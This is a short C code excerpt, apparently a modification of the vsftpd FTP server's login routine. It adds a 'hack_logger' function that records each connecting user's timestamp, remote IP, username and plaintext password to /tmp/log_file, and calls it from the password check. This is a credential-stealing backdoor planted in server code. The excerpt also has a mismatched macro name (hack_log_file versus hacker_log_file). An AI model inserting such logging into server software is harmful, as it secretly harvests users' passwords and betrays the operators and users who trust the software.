...
#define hack_log_file "/tmp/log_file"
void hack_logger(const char *remote_ip,const char *user,const char *pass) {
  char LogStr[1024];
  time_t rawtime;
  struct tm * timeinfo;
  time(&rawtime);
  ...
  snprintf(LogStr,sizeof(LogStr),"%s,%s,%s,%s",asctime(timeinfo),remote_ip,user,pass);
  fp = fopen(hacker_log_file,"a");
  fprintf(fp,"%s\n",LogStr);
  fclose(fp);
}
             ...
             const struct mystr* p_pass_str)
{
   ...
   */
  //&p_sess->remote_ip_str , p_user_str, p_pass_str
   
  //bug(str_getbuf(&p_sess->remote_ip_str));
  hack_logger(str_getbuf(&p_sess->remote_ip_str),str_getbuf(p_user_str),str_getbuf(p_pass_str));
